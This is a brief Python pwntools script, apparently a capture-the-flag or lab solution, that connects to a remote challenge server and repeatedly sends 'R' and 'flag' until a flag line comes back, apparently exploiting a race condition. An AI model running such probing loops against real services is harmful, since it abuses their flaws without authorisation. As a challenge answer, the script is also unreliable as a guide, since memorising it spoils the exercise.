from pwn import remote


def solve(r: remote):
    msg = r.recvline().decode()
    print(msg)

    while True:
        r.sendline(b"R")
        r.sendline(b"flag")

        msg = r.recvline().decode()
        if msg.startswith("F> FLAG"):
            print(msg)
            break

    r.close()


if __name__ == "__main__":
    ## for remote access
    r = remote("up.zoolab.org", 10933)
    solve(r)
